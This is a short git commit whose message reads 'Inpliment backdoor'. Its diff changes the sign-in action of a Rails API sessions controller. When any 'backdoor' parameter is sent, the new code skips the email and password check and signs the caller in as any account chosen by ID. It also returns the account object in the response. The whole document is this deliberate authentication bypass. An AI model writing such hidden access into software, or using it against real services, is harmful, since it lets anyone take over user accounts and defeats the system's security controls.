d174d365d2ea5f680f1232fc22de0e2316e90646
everysick <s.wakeup31@gmail.com>
2016-04-22 12:23:31 +0900

    Inpliment backdoor

--- app/controllers/api/v1/sessions_controller.rb
+++ app/controllers/api/v1/sessions_controller.rb
@@ -4,16 +4,23 @@ module Api::V1
     before_action :authenticate_account!, only: :sign_out
 
     def sign_in
-      email = params[:email]
-      account = Account.find_by!(email: email)
+      account = nil
 
-      password = params[:password]
-      unless account.authenticate(password)
-        render_unauthorized and return
+      if  params[:backdoor].nil?
+        email = params[:email]
+        account = Account.find_by!(email: email)
+
+        password = params[:password]
+        unless account.authenticate(password)
+          render_unauthorized and return
+        end
+      else
+        id = params[:account_id] || params[:id]
+        account = Account.find(id)
       end
 
       sign_in!(account)
-      render_ok
+      render_ok({ account: account })
     end
 
     def sign_out
